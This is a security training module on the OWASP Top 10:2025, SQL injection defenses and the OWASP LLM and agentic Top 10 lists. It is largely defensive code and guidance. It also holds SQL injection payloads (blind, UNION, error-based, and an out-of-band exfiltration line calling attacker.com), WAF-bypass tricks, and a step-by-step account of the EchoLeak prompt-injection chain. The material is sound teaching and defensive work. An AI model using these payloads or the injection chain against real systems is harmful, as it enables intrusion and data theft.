# OWASP Top 10 + OWASP LLM Top 10, SQL Injection Deep

> **Track:** T12 DevOps, Infra & Security · **Time:** 2.5h · **Prereqs:** T12-secrets · **Updated:** 2026-08-05
> **Module id:** `T12-owasp` · **Tags:** security, owasp, sqli, llm-security, critical

## The 30-second version

The OWASP Top 10:2025 is an awareness document, not a requirements standard, and the single most useful fact about it is that Injection fell from #3 to #5 while remaining the category with the most CVEs (62,445 across 37 CWEs) because the ranking is incidence-rate-weighted and 30,000+ low-impact XSS CVEs drag Injection's average weighted impact down to 4.32. SQL injection itself is a parser problem, not a string problem: the fix is to never let attacker bytes reach the SQL parser as grammar, which parameterized queries guarantee for *values* and cannot do at all for *identifiers* (table names, column names, `ORDER BY` direction), so identifiers need a server-controlled allowlist and nothing else. Escaping is the defense that keeps failing, and CVE-2025-1094 is the proof: PostgreSQL's own `PQescapeLiteral()` failed to neutralize quoting when handed invalid UTF-8, and that bug was the required link in the chain that turned a BeyondTrust auth bypass into RCE at the US Treasury. The LLM Top 10 exists because LLM01 Prompt Injection is the injection class with no parameterized-query equivalent: there is no way to mark a span of the context window as data-not-instructions, so the working defense in 2026 is containment (least-privilege tools, provenance tracking, human gates on irreversible actions), not detection. If someone tells you their prompt-injection classifier solves it, name EchoLeak (CVE-2025-32711, CVSS 9.3), which bypassed Microsoft's purpose-built XPIA classifier and exfiltrated M365 Copilot context with zero clicks.

## Why this gets asked

Because "we're OWASP compliant" is a sentence that means nothing, and the interviewer wants to find out in ninety seconds whether you know that. OWASP publishes the Top 10 explicitly as an awareness document, ranks it from data covering 2.8 million applications, and then lets a community popularity survey promote two of the ten slots. A candidate who recites the list in order has memorized a poster. A candidate who can say "Injection is #5 but it has the highest CVE count and the second-highest weighted exploit score, so the rank is telling you about *test coverage and prevalence*, not about what will end your quarter" has read the methodology.

The SQL injection half gets asked because it is the one vulnerability where interviewers can check whether you understand a mechanism or a mantra. Everyone says "use prepared statements." The interviewer has personally shipped a feature with a user-controlled `ORDER BY`, discovered that `cursor.execute("... ORDER BY %s", (col,))` produces `ORDER BY 'created_at'` (a constant string, so no sort at all) rather than an error, and watched someone "fix" it with an f-string. They want to see whether you know what a bind parameter physically is.

The LLM half gets asked because the person across the table is currently trying to ship an agent with tool access and does not know how to write the threat model. If you have production agentic experience, this is where you convert it into signal: name the trust boundary, name what you would deny by default, and name what you would gate on a human.

---

## Lineage: past → present → future

**What came before.** SQL injection was described publicly by Jeff Forristal ("rain.forest.puppy") in *Phrack* 54 in December 1998, and the industry's first decade of response was string filtering: strip quotes, blocklist `UNION`, `--`, `xp_cmdshell`, and later PHP's `magic_quotes_gpc`, which auto-escaped every request variable and was so damaging that it was deprecated in PHP 5.3 (2009) and removed in 5.4 (2012). The specific pain that killed filtering was that it was a *countermeasure at the wrong layer*: the SQL grammar has many equivalent encodings of the same token, so every blocklist got bypassed by comment insertion (`UN/**/ION`), case shifting, hex literals, versioned comments (`/*!50000UNION*/` on MySQL), and multi-byte charset tricks where a `0x5c` backslash from `addslashes()` got consumed as the second byte of a GBK character and freed the quote. The Heartland Payment Systems breach (disclosed January 2009, ~130 million card records, attributed to Albert Gonzalez) and the 2011 Sony Pictures dump were both SQL injection against applications that had filtering. Parameterized queries won the argument not because they escape better but because they remove escaping from the problem entirely: the query text is parsed once with placeholders in it, and the parameter values are transported separately and bound to already-planned slots, so they can never be re-parsed as grammar. Meanwhile the OWASP Top 10 itself began in 2003 as a hand-assembled consensus list; it did not become data-backed until the 2017 and 2021 editions.

**Where it stands now.** OWASP Top 10:2025 is the 8th installment, announced November 2025 at Global AppSec in Washington DC with the final web release in January 2026. It analyzed 589 CWEs (up from ~400 in 2021 and ~30 in 2017) across data on 2.8 million applications from 13 named contributors including Veracode, Semgrep, Sonar, Contrast, and Bugcrowd, and mapped exploit and impact scores from roughly 175,000 CVE-to-CWE records in NVD. The two new categories are A03 Software Supply Chain Failures (an expansion of 2021's Vulnerable and Outdated Components, and the category with the *fewest* data occurrences but the *highest* average exploit and impact scores) and A10 Mishandling of Exceptional Conditions (24 CWEs covering fail-open logic and improper error handling). SSRF, which was its own 2021 category, was folded into A01 Broken Access Control, which stays at #1 with a 3.73% average incidence rate across 40 CWEs. The methodology is where the genuine disagreement lives: OWASP calls it "data-informed, but not blindly data-driven," takes only 8 of 10 categories from the data, and lets a community survey vote in the other 2. Critics argue that makes the rank order a popularity-weighted hybrid that should never be used for prioritization; OWASP's own counter-argument is that the data can only contain what tooling can already test for, which is a backward-looking view that would have missed supply chain attacks entirely. The related live split is whether the Top 10 should be used as a control set at all. It should not. ASVS is the requirements standard; the Top 10 is training. Every organization that has ever put "no OWASP Top 10 findings" in a vendor contract has learned that a pentest can pass that gate and still hand over the database.

On the AI side, the OWASP GenAI Security Project shipped the LLM Top 10 v2.0 on 18 November 2024 for the 2025 cycle (LLM01 Prompt Injection through LLM10 Unbounded Consumption), the Top 10 for Agentic Applications on 9 December 2025 with 100+ contributors (ASI01 Agent Goal Hijack through ASI10 Rogue Agents), and a 2026 LLM Top 10 revision on 3 August 2026, two days before this module was written. What is actually deployed at scale versus merely published is stark here. Deployed: input/output classifiers, tool allowlists enforced at the gateway rather than in the prompt, per-agent identities, step and token budgets, and human confirmation on irreversible actions. Published but essentially not deployed: CaMeL-style capability interpreters that track data provenance through a plan and refuse tool calls whose arguments derive from untrusted spans (arXiv 2506.08837 and the CaMeL line of work). The reason is not ignorance, it is that provenance-tracking architectures require you to give up free-form model-authored tool arguments, which is most of why teams bought an agent in the first place.

**Where it's heading.** Three directions with different confidence levels. First, high confidence: identifier-level and structural query safety moves into the framework layer. Django, SQLAlchemy, and psycopg have all added composable identifier types (`psycopg.sql.Identifier`, SQLAlchemy's `text()` bindparams) and the direction of travel is that raw-SQL escape hatches get linted at CI rather than reviewed by humans. Semgrep and CodeQL rules for "user input reaching `.raw()` / `.extra()` / string-formatted `text()`" are already table stakes. Second, medium confidence: prompt injection defense consolidates on *containment with formal-ish guarantees* rather than detection, meaning provenance tags on context spans plus a policy engine at the tool boundary. This is the direction the CaMeL and dual-LLM design-pattern literature points, and the 2026 agentic Top 10's emphasis on per-agent identity (ASI03) and blast-radius isolation (ASI08) is consistent with it, but calling it settled would be dishonest. Third, low confidence and explicitly speculative: that the three OWASP Top 10s (web, LLM, agentic) merge or get cross-walked into a single risk taxonomy. The AIUC-1 crosswalk published May 2026 is early evidence, but three separate lists with overlapping content is currently a real usability problem and there is no signal that OWASP intends to collapse them.

---

## Mental model

The whole module reduces to one picture: **where does attacker-controlled data cross into a position where an interpreter treats it as structure?**

```
                     THE INJECTION TEMPLATE (identical for all of them)

   attacker bytes ──▶ [ concatenation / templating ] ──▶ INTERPRETER
                                                            │
                                                            ├─ SQL parser      → SQLi
                                                            ├─ shell           → command injection
                                                            ├─ HTML parser     → XSS
                                                            ├─ LDAP filter     → LDAP injection
                                                            ├─ OGNL / EL       → RCE (Struts, Log4Shell-adjacent)
                                                            └─ LLM attention   → PROMPT INJECTION

   The fix, everywhere except the last row:
       send STRUCTURE and DATA over separate channels so the interpreter
       never re-parses the data.

   SQL:   PREPARE "SELECT * FROM t WHERE id=$1"   ← structure, parsed once
          BIND    $1 = "'; DROP TABLE t; --"      ← data, never parsed
   Shell: execve("/usr/bin/nslookup", ["nslookup", domain])  ← argv, no shell
   HTML:  textNode.data = untrusted               ← DOM API, no parser

   LLM:   ...there is no second channel. The system prompt, the user turn,
          and the retrieved document are all the same token stream, attended
          to by the same mechanism. THAT is why LLM01 is unsolved.
```

And the SQL half of it, one level down:

```
  UNSAFE                                   SAFE
  ------                                   ----
  "WHERE id = " + s                        "WHERE id = $1"      ← value → BIND
  "ORDER BY " + col                        allowlist{created_at, name}[col]
  "ORDER BY x " + dir                      {"asc":"ASC","desc":"DESC"}[dir]
  "FROM " + tenant_table                   psycopg.sql.Identifier(name)
  "LIMIT " + n                             "LIMIT $2"  (or int(n) with bounds)
  "IN (" + ",".join(ids) + ")"             "= ANY($1)" with a Python list

  RULE: bind parameters replace VALUES. They can never replace IDENTIFIERS
  or KEYWORDS, because the planner needs those to build the plan.
  Anything you cannot bind must come from a set the SERVER controls.
```

---

## How it actually works

### 1. The 2025 list, with the numbers that make the ranking legible

| # | Category | CWEs | Avg incidence | Notes worth saying out loud |
|---|---|---|---|---|
| A01 | Broken Access Control | 40 | 3.73% | #1 again. **SSRF folded in here** from 2021's A10 |
| A02 | Security Misconfiguration | 16 | 3.00% | Up from #5. More app behavior is config now |
| A03 | Software Supply Chain Failures | 5 | low | New. Fewest occurrences, **highest** avg exploit + impact |
| A04 | Cryptographic Failures | 32 | 3.80% | Down from #2 |
| A05 | Injection | 37 | 3.08% | **62,445 CVEs, the most of any category** |
| A06 | Insecure Design | — | — | Down from #4. OWASP credits threat modeling adoption |
| A07 | Authentication Failures | 36 | — | Renamed from "Identification and Authentication Failures" |
| A08 | Software or Data Integrity Failures | — | — | Trust boundaries below the supply-chain layer |
| A09 | Security Logging **& Alerting** Failures | 5 | — | Renamed: logging without alerting is worth ~0 |
| A10 | Mishandling of Exceptional Conditions | 24 | — | New. Fail-open, bad error handling, logic errors |

The A05 score row is the one to memorize because it is the one that makes the "why is Injection only #5?" answer possible:

```
CWEs mapped        37          Max incidence      13.77%
Avg incidence      3.08%       Max coverage       100.00%   ← everyone tests for it
Avg coverage       42.93%      Avg wtd exploit    7.15      ← very high
Avg wtd impact     4.32        Total occurrences  1,404,249
Total CVEs         62,445      (XSS >30k, SQLi >14k)
```

Injection is at 100% max coverage: every scanner and every pentester tests for it, so it is *maximally observable*, and its measured incidence is a real 3.08% rather than an artifact of nobody looking. Its average weighted impact of 4.32 is dragged down by the 30,000+ CWE-79 XSS CVEs, which are high-frequency and low-impact, sharing a category with the 14,000+ CWE-89 SQL injection CVEs, which are the opposite. That is the whole answer to "why did Injection drop two places." It is a category-composition artifact, not a claim that SQLi stopped mattering.

Two more methodology numbers that separate people who read the doc from people who read a blog about the doc: the ranking uses **incidence rate**, defined as the percentage of tested applications with *at least one* instance of a CWE, deliberately ignoring frequency, because manual testers report a finding once while automated scanners report every instance. And the exploit/impact halves come from CVSS v2 and v3 only. CVSS v4 was excluded (only ~6k of the ~220k extracted CVEs had v4 scores anyway) because v4 changed the scoring algorithm and no longer exposes separable Exploit and Impact subscores.

> Note the inconsistency: the A05 page states 37 CWEs and the Introduction page states 38 for the same category. Both are OWASP primary sources as of 2026-08-05. Use 37 if pressed, cite the A05 score table, and mention that the doc disagrees with itself. Interviewers who wrote the doc will enjoy this; interviewers who did not will assume you read it.

### 2. SQL injection, one level below "use prepared statements"

**What a bind parameter physically is.** In the PostgreSQL extended query protocol the client sends `Parse` with the SQL text containing `$1` placeholders, the server parses and plans it, then the client sends `Bind` with the parameter values as a length-prefixed binary or text array, then `Execute`. The parameter bytes never touch the SQL lexer. This is why parameterization is a *guarantee* and escaping is a *best effort*: there is no string to get the escaping wrong on.

The corollary that trips people up: because the plan is built at `Parse` time, the planner must already know the tables, columns, and sort direction. Those cannot be parameters. Ever. In any database.

```python
# psycopg3. Values: bind. Identifiers: compose from a server-controlled allowlist.
from psycopg import sql

SORTABLE = {"created_at": "created_at", "name": "name", "score": "score"}
DIRECTIONS = {"asc": sql.SQL("ASC"), "desc": sql.SQL("DESC")}

def list_docs(cur, tenant_id: str, sort_by: str, direction: str, limit: int):
    col = SORTABLE.get(sort_by)                 # KeyError-safe allowlist, not a regex
    if col is None:
        raise ValueError(f"unsortable column: {sort_by!r}")
    dir_ = DIRECTIONS.get(direction.lower())
    if dir_ is None:
        raise ValueError(f"bad direction: {direction!r}")

    query = sql.SQL("SELECT id, title FROM docs WHERE tenant_id = %s ORDER BY {} {} LIMIT %s").format(
        sql.Identifier(col), dir_
    )
    cur.execute(query, (tenant_id, min(int(limit), 200)))   # values bound, limit clamped
    return cur.fetchall()
```

Three things this gets right. The allowlist is a `dict` lookup, so an unknown key raises rather than falling through. `sql.Identifier` quotes and escapes the identifier per the server's rules (and would still be safe even if `col` were attacker-controlled, though you should not rely on that as the only layer). And `limit` is bound *and* clamped, because an unclamped `LIMIT 100000000` is a denial-of-service even when it is perfectly parameterized.

**The `ORDER BY %s` trap specifically.** This is the single most reported real interview question on this topic:

```python
cur.execute("SELECT * FROM docs ORDER BY %s", ("created_at",))
# Generates: SELECT * FROM docs ORDER BY 'created_at'
# Postgres sorts by a CONSTANT STRING. No error. No sort. Silently wrong.
```

It does not raise. It produces an unsorted result set. Which is why the next commit is usually an f-string.

**Second-order (stored) SQL injection.** The payload is stored safely, then a *different* code path concatenates it into a query later:

```python
# Registration: parameterized. The payload is stored as literal text. No injection here.
cur.execute("INSERT INTO users (username) VALUES (%s)", ("admin'--",))

# Nightly report, six months later, written by a different team:
cur.execute(f"SELECT * FROM audit WHERE username = '{row['username']}'")
#   → SELECT * FROM audit WHERE username = 'admin'--'
```

Second-order is why "sanitize on input" is the wrong model. Data from your own database is not trusted data; it is attacker data with a longer latency. The correct model is **parameterize on output**, at every point where a value enters an interpreter, regardless of provenance. Every SAST tool that only taints HTTP request objects misses this class, which is exactly the gap the second-order detection literature exists to close.

**Blind SQLi, and what it looks like in your logs.** When the response body carries no data, attackers extract one bit at a time.

| Variant | Payload shape | Observable symptom |
|---|---|---|
| Boolean-blind | `' AND SUBSTR((SELECT pw FROM u LIMIT 1),1,1)>'m'--` | Thousands of 200s on one endpoint, response body alternating between two exact byte lengths |
| Time-blind | `'; SELECT pg_sleep(5)--` / `SLEEP(5)` / `WAITFOR DELAY '0:0:5'` | p50 latency on one route quantized to multiples of ~5s, all HTTP 200 |
| Error-based | `' AND 1=CAST((SELECT version()) AS int)--` | 500s whose DB error text contains the leaked value |
| UNION-based | `' UNION SELECT NULL,NULL,version()--` | A run of requests probing `ORDER BY 1`, `2`, `3`... then `UNION SELECT NULL,...` with increasing NULL counts |
| Out-of-band | MSSQL `xp_dirtree '\\attacker.com\x'`, Oracle `UTL_HTTP` | DNS queries from your DB subnet to a domain nobody owns |

Cost model, so you can answer "how long does that take": boolean-blind binary search over printable ASCII is about 7 requests per character. A 60-character bcrypt hash costs roughly 420 requests, which at 20 rps is 21 seconds. Time-based is much slower (one 5-second sleep per bit, so ~7 x 5s = 35s per character, ~35 minutes for the same hash) which is why time-based is a *confirmation* technique and boolean or UNION is the *extraction* technique. If your rate limiting is per-user and the attacker is unauthenticated, you have no rate limiting.

**Escaping fails, with a primary-source receipt.** CVE-2025-1094 (CVSS 3.1 8.1, disclosed 2025-02-13, found by Stephen Fewer at Rapid7) is a flaw in PostgreSQL's own escaping APIs: `PQescapeLiteral()`, `PQescapeIdentifier()`, `PQescapeString()`, and `PQescapeStringConn()` failed to neutralize quoting syntax in text that fails UTF-8 encoding validation. Fixed in 17.3 / 16.7 / 15.11 / 14.16 / 13.19, and then the fix itself regressed (the length parameter was ignored) and needed 17.4 / 16.8 / 15.12 / 14.17 / 13.20 on 2025-02-20. Rapid7 found it while investigating CVE-2024-12356, the BeyondTrust Privileged Remote Access / Remote Support unauthenticated RCE, and reported that in every scenario they tested, exploiting CVE-2024-12356 to RCE *required* CVE-2025-1094. That chain is the one that reached the US Treasury in January 2025.

The lesson to state in an interview: the escaping function shipped by the database vendor, in the database's own client library, had an injection bug, and it took two releases to fix. If your defense is "we escape correctly," your defense is a dependency on someone else's parser edge cases. Bind parameters have no parser edge cases because there is no parse.

**ORM injection is real and is not "raw SQL only."** CWE-564 (SQL Injection: Hibernate) is in the A05 CWE list precisely because HQL concatenation is injectable even though HQL is not SQL. In Python:

```python
# Django: these four are the escape hatches. Grep for them in review.
Doc.objects.raw(f"SELECT * FROM docs WHERE t='{t}'")     # injectable
Doc.objects.extra(where=[f"title LIKE '%{q}%'"])          # injectable
Doc.objects.annotate(x=RawSQL(f"...{q}...", []))          # injectable
Doc.objects.filter(**{f"{user_field}__icontains": q})     # field name from user: leaks via relation traversal

# SQLAlchemy: text() is safe ONLY with bindparams
session.execute(text("SELECT * FROM docs WHERE t = :t"), {"t": t})       # safe
session.execute(text(f"SELECT * FROM docs WHERE t = '{t}'"))             # injectable
```

And the ORM itself can carry the bug. CVE-2024-42005 was a SQL injection in Django's `QuerySet.values()` / `values_list()` when used on a model with a `JSONField`: a crafted JSON object key, passed as a positional arg, was used unescaped as a **column alias**, which is an identifier position. Fixed in Django 4.2.15 and 5.0.8. The pattern generalizes: ORM injections almost always live where the ORM has to emit an *identifier* derived from user input, because that is the position bind parameters cannot cover.

**Defense in depth below the query.** Parameterize first, then:

- Least-privilege DB role. The app role should have no DDL, no `COPY`/`pg_read_server_files`, no superuser, and ideally separate read and write roles per service. A successful `UNION SELECT` that can only read the three tables the service owns is an incident; one that can read `pg_shadow` is a resume-generating event.
- Row-level security or a mandatory `tenant_id` predicate enforced by a query-builder wrapper, not by developer discipline (covered in depth in `T12-authz`).
- Never return raw DB errors to clients. Error-based extraction requires the error text.
- A WAF is a speed bump for unskilled attackers and a source of false confidence for everyone else. Say this plainly.

### 3. The LLM Top 10 and the injection that has no bind parameter

The 2025 (v2.0) list, published 18 November 2024:

```
LLM01 Prompt Injection              LLM06 Excessive Agency
LLM02 Sensitive Information Disclosure  LLM07 System Prompt Leakage
LLM03 Supply Chain                  LLM08 Vector and Embedding Weaknesses
LLM04 Data and Model Poisoning      LLM09 Misinformation
LLM05 Improper Output Handling      LLM10 Unbounded Consumption
```

The 2026 revision was published 2026-08-03. I could not verify from a primary source whether the category names or ordering changed, because OWASP publishes it as a gated PDF and the secondary coverage available on 2026-08-05 still reproduces the 2025 names. **Treat "the 2026 edition exists, published 3 Aug 2026, mapped to NIST, MITRE ATLAS, CWE, and the Agentic Top 10" as verified and the category list above as the 2025 v2.0 list.** Saying exactly that in an interview is a stronger signal than confidently reciting a list you have not read.

The Top 10 for Agentic Applications 2026 (published 9 December 2025, 100+ contributors) is the one that matters for anyone shipping agents:

```
ASI01 Agent Goal Hijack             ASI06 Memory & Context Poisoning
ASI02 Tool Misuse & Exploitation    ASI07 Insecure Inter-Agent Communication
ASI03 Identity & Privilege Abuse    ASI08 Cascading Failures
ASI04 Agentic Supply Chain Vulns    ASI09 Human-Agent Trust Exploitation
ASI05 Unexpected Code Execution     ASI10 Rogue Agents
```

(ASI names above are from secondary coverage of the OWASP PDF; the PDF itself is a gated download.)

**Why LLM01 has no fix.** Go back to the mental model. Every injection defense that works, works by giving structure and data separate transport so the interpreter never re-parses data as grammar. A transformer has exactly one input channel. The system prompt, the user turn, the retrieved chunk, and the tool result are all tokens in one sequence attended to by one mechanism. There is no `Bind` message. Delimiters ("everything between `<untrusted>` tags is data") are a convention the model can be talked out of, because the model is the thing being attacked. Fine-tuned instruction-hierarchy models raise the cost of an attack and provide no guarantee.

EchoLeak (CVE-2025-32711, CVSS 9.3, disclosed June 2025 by Aim Security) is the canonical demonstration. A single email, zero clicks. The chain: bypass Microsoft's XPIA (Cross-Prompt Injection Attempt) classifier, evade link redaction using reference-style Markdown, trigger exfiltration through an auto-fetched image URL, and route the callback through a Microsoft Teams proxy that was already allowed by the Content Security Policy. Microsoft patched it server-side and reported no in-the-wild exploitation. The important part for an interview is not the CVE number, it is that a purpose-built prompt-injection classifier shipped by the vendor with the most to lose was bypassed by a chain of four ordinary web bugs. Classifier-only defense is not a defense.

**And SQLi came back through the AI layer.** CVE-2026-42208 is a pre-authentication SQL injection in LiteLLM (CVSS 9.3, affecting 1.81.16 through 1.83.6, patched in 1.83.7-stable). LiteLLM concatenated the raw value of the `Authorization: Bearer` header into SQL on the API-key verification path, which means **every** LLM route was an injection entry point and none of them required credentials. Reported exploitation began within 36 hours of the advisory being indexed in the GitHub Advisory Database, using 17 distinct UNION-based payloads to enumerate the schema and going straight for `LiteLLM_VerificationToken`, `litellm_credentials`, and `litellm_config`, which is to say: every upstream provider key the proxy held. CISA added it to the Known Exploited Vulnerabilities catalog on 8 May 2026 with a federal remediation deadline of 11 May 2026.

That is the sentence to have ready: the most consequential SQL injection in the AI stack in the last year was CWE-89 in the auth path of a gateway, exploited before most teams knew they had it in their dependency tree, and it exfiltrated credentials for every model provider at once.

**LLM05 Improper Output Handling** is the other half of the same coin: model output is untrusted input to whatever consumes it. If the model writes SQL and you execute it, you have built a remote code execution service with extra steps. Text-to-SQL systems need a read-only role, a statement allowlist, a parsed-AST check (reject anything that is not a single `SELECT`), and a row cap, in that order. "The prompt says only generate SELECT statements" is not a control.

---

## Build it from scratch

A safe-query layer that makes the unsafe thing hard to write. This is the shape of what you would actually put in a codebase, and it is the thing to sketch on a whiteboard.

```python
# (lab pending)safe_query.py
# Runnable against psycopg3 + Postgres. Tested shape; adapt the driver as needed.
from __future__ import annotations
import re
from dataclasses import dataclass
from psycopg import sql

IDENT_RE = re.compile(r"^[a-z_][a-z0-9_]{0,62}$")   # belt; allowlist is the braces


@dataclass(frozen=True)
class SortSpec:
    """A sort the SERVER permits. User input selects one; it never constructs one."""
    columns: frozenset[str]
    default: str

    def resolve(self, requested: str | None, direction: str | None) -> sql.Composed:
        col = requested if requested in self.columns else self.default
        if not IDENT_RE.match(col):                  # unreachable if columns is curated
            raise ValueError(f"illegal identifier {col!r}")
        dir_sql = sql.SQL("DESC") if (direction or "").lower() == "desc" else sql.SQL("ASC")
        return sql.SQL("{} {}").format(sql.Identifier(col), dir_sql)


DOC_SORTS = SortSpec(columns=frozenset({"created_at", "title", "score"}), default="created_at")
MAX_LIMIT = 200


def search_docs(conn, *, tenant_id: str, q: str, sort: str | None,
                direction: str | None, limit: int) -> list[tuple]:
    order = DOC_SORTS.resolve(sort, direction)
    stmt = sql.SQL(
        """
        SELECT id, title, created_at
          FROM docs
         WHERE tenant_id = %(tenant)s          -- always present, never optional
           AND title ILIKE %(pattern)s
         ORDER BY {order}
         LIMIT %(limit)s
        """
    ).format(order=order)

    params = {
        "tenant": tenant_id,
        # escape LIKE metacharacters: '%' and '_' in user input are not injection,
        # but they ARE a wildcard-scan DoS and a logic bug.
        "pattern": "%" + q.replace("\\", "\\\\").replace("%", r"\%").replace("_", r"\_") + "%",
        "limit": max(1, min(int(limit), MAX_LIMIT)),
    }
    with conn.cursor() as cur:
        cur.execute(stmt, params)
        return cur.fetchall()


def ids_in(conn, tenant_id: str, ids: list[int]) -> list[tuple]:
    """The IN-clause trap. Do NOT build '(1,2,3)' with str.join."""
    with conn.cursor() as cur:
        cur.execute(
            "SELECT id, title FROM docs WHERE tenant_id = %s AND id = ANY(%s)",
            (tenant_id, list(ids)),           # one placeholder, a real array
        )
        return cur.fetchall()
```

A CI rule is worth more than the code above, because the code above only protects the paths that use it:

```yaml
# .semgrep/no-raw-sql.yml   — untested sketch, adjust to your Semgrep version
rules:
  - id: py-fstring-into-sql
    languages: [python]
    severity: ERROR
    message: "String-formatted SQL. Use bind parameters; use sql.Identifier for identifiers."
    patterns:
      - pattern-either:
          - pattern: $CUR.execute(f"...")
          - pattern: $CUR.execute("..." % $X)
          - pattern: $CUR.execute("...".format(...))
          - pattern: sqlalchemy.text(f"...")
          - pattern: $M.objects.raw(f"...")
          - pattern: $M.objects.extra(...)
```

Full lab with a deliberately vulnerable Flask endpoint, a boolean-blind extractor that measures requests-per-character, a time-based confirmer, a second-order path, and the fixed version: **`(lab pending)`**.

---

## How it's done in production

**The remediation order that actually reduces risk**, which is not the order of the Top 10:

1. Parameterize every value; allowlist every identifier. Enforce with a CI rule, not review.
2. Drop the app DB role to least privilege. Verify by trying `SELECT * FROM pg_shadow` as the app user in staging.
3. Turn off DB error propagation to clients. Log the error server-side with a correlation id.
4. Add authorization checks at the data-access layer, not the controller (A01 is #1 for a reason; see `T12-authz`).
5. Pin and scan dependencies (A03). The LiteLLM CVE was a dependency, not your code.
6. Then, and only then, buy the WAF if compliance requires one.

**Tooling and what each actually catches:**

| Tool class | Catches | Misses |
|---|---|---|
| SAST (Semgrep, CodeQL, Sonar) | Direct taint from request to sink | Second-order (DB → sink), custom query builders |
| DAST (ZAP, Burp) | Reflected/blind SQLi on reachable routes | Anything behind auth it cannot reach; second-order |
| IAST (Contrast) | Runtime taint including some second-order | Coverage limited to exercised paths |
| SCA (Dependabot, Snyk) | CVE-2024-42005, CVE-2026-42208 class | Your own code |
| DB audit log | Actual anomalous queries in prod | Nothing, until someone reads it (A09) |

**Failure-mode table:**

| Symptom | Cause | Fix |
|---|---|---|
| One endpoint's p50 latency is quantized to multiples of ~5s, all responses 200 | Time-based blind SQLi in progress; `pg_sleep`/`SLEEP`/`WAITFOR` | Block at the edge, then find the concatenated query. Add a statement timeout (`SET statement_timeout = '2s'`) so sleeps fail fast |
| Thousands of 200s on one route, response bodies alternating between exactly two byte lengths | Boolean-blind extraction, ~7 requests per character | Rate-limit unauthenticated routes; normalize response bodies so true/false are indistinguishable |
| A burst of `ORDER BY 1`, `ORDER BY 2`, ... then `UNION SELECT NULL,NULL,...` | UNION-based column-count probing | Parameterize; least-privilege role limits what the UNION can reach |
| DB error log shows `UNION types text and integer cannot be matched` | Attacker mid-UNION, type mismatch on the probe | Same as above. This is a *detection* signal, alert on it |
| `ORDER BY` silently stops sorting after a "fix" | `ORDER BY %s` binds a string constant; no error raised | Allowlist + `sql.Identifier`. Add a test asserting sort order |
| Nightly report job 500s on one tenant; the payload is visible as literal text in a profile field | Second-order SQLi: safely stored, unsafely re-queried | Parameterize the *reader*. Stop treating DB reads as trusted |
| DNS queries leaving the DB subnet to a domain you do not own | Out-of-band exfiltration (`xp_dirtree`, `UTL_HTTP`) | Egress-deny from the DB subnet; revoke the functions |
| Agent calls a tool whose arguments do not derive from any user turn in the trace | Indirect prompt injection via a retrieved document (LLM01 / ASI01) | Provenance-tag context spans; deny tool calls in the same turn as an untrusted read; human gate irreversible actions |
| LLM provider bill 40x normal overnight, one API key | LLM10 Unbounded Consumption, or a runaway agent loop (ASI08) | Per-key token budgets, max step count, hard wall-clock timeout per run |
| All upstream provider keys rotate-worthy after a gateway CVE | Pre-auth SQLi in the proxy's key-verification path (CVE-2026-42208) | Patch, rotate every provider key, and stop storing provider keys in the same DB the proxy queries pre-auth |

---

## Tradeoffs & when NOT to use it

- **Do not use the OWASP Top 10 as a security requirements document.** It is explicitly an awareness document, 2 of its 10 slots come from a popularity survey, and its rank order reflects incidence and test coverage rather than risk to *your* system. Use ASVS for requirements and the Top 10 for training and for talking to executives. "No OWASP Top 10 findings" as a contractual gate is theatre, and saying so is a senior signal.
- **Do not treat the rank order as a remediation order.** A03 Supply Chain has the fewest occurrences in the dataset and the highest average exploit and impact scores. Ranking by prevalence and remediating by prevalence are different activities.
- **Do not rely on input validation or escaping as the primary SQLi defense.** OWASP's own guidance calls positive validation "not a complete defense," and CVE-2025-1094 is the vendor's own escaping function failing. Validation is a good second layer and a terrible first one.
- **Do not deploy a WAF and call SQLi handled.** Comment insertion, versioned comments, case shifting, and encoding all bypass signature rules. A WAF buys you time to patch. It does not buy you correctness. It is still worth having when you cannot patch a third-party app.
- **Do not use `ORDER BY %s` and assume the driver protects you.** It binds a string constant, produces no error, and silently removes the sort. The absence of an exception is not evidence of safety.
- **Do not apply the full LLM Top 10 to a system that has no tools, no retrieval, and no downstream execution.** A stateless completion endpoint whose output is rendered as escaped text has a genuinely small attack surface: LLM02, LLM09, and LLM10 apply, most of the rest do not. Running an agentic threat model over it burns budget that A01 needs. The categories that matter scale with *agency*, not with the presence of a model.
- **Do not promise that prompt injection is solved by your classifier.** State the containment posture instead: least-privilege tools enforced at the gateway rather than in the prompt, no high-risk tool in the same turn as an untrusted read, per-agent identity with short-lived scoped credentials, step and token budgets, human confirmation on irreversible actions, and full prompt-to-action traces. If someone asks for a guarantee, the honest answer is that nobody has one.
- **Do not let a text-to-SQL feature run with the app's normal DB role.** Read-only role, AST parse that rejects anything but a single `SELECT`, statement timeout, row cap. If the product needs writes, it needs a human approving a diff, not a model with `INSERT`.
- **The counter-argument worth stating:** some practitioners argue that ORMs plus modern frameworks have made hand-written SQLi defense a solved problem not worth interview time, and that A01 access control deserves the attention instead. They are directionally right about greenfield application code and wrong about the seams: identifier positions, raw-SQL escape hatches, second-order paths, stored procedures, analytics query builders, and every gateway and admin tool in your dependency tree. CVE-2026-42208 was written in 2026 by people who knew about SQL injection.

---

## Interview questions

### Q1 — Name the OWASP Top 10:2025 changes from 2021.
**Testing:** whether you have read the current edition or a 2021 blog post.
**Answer:** Two new categories and one consolidation. A03 Software Supply Chain Failures is new, expanded from 2021's A06 Vulnerable and Outdated Components to cover dependencies, build systems, and distribution infrastructure. A10 Mishandling of Exceptional Conditions is new, 24 CWEs covering fail-open logic and improper error handling. SSRF, which was its own 2021 A10, folded into A01 Broken Access Control. A02 Security Misconfiguration moved 5 to 2, Cryptographic Failures 2 to 4, Injection 3 to 5, Insecure Design 4 to 6. A07 was renamed to Authentication Failures and A09 to Security Logging **and Alerting** Failures.
**Follow-up trap:** *"Why rename A09?"* — because logging without alerting has approximately zero incident-detection value, and OWASP wanted the name to carry the control rather than the artifact. Teams pass a logging audit and still find out about breaches from a journalist.

### Q2 — Injection dropped from #3 to #5. Did SQL injection get less dangerous?
**Testing:** whether you understand the methodology or read the poster.
**Answer:** No. The ranking is driven by incidence rate (the percentage of tested applications with at least one instance) combined with CVSS-derived average exploit and impact. Injection has the most CVEs of any category, 62,445 across 37 CWEs, and the highest max coverage at 100%, meaning everyone tests for it. Its average weighted impact of 4.32 is pulled down because 30,000+ high-frequency, low-impact XSS CVEs share the category with 14,000+ low-frequency, high-impact SQLi CVEs. The rank moved because of category composition, not because SQLi stopped mattering. Average weighted exploit for the category is still 7.15.
**Follow-up trap:** *"So is the Top 10 a prioritization list?"* — no, and OWASP says so. It is an awareness document. Eight categories come from data and two are voted in by a community survey specifically because the data can only include what tooling can already test for. For prioritization use ASVS plus your own threat model.

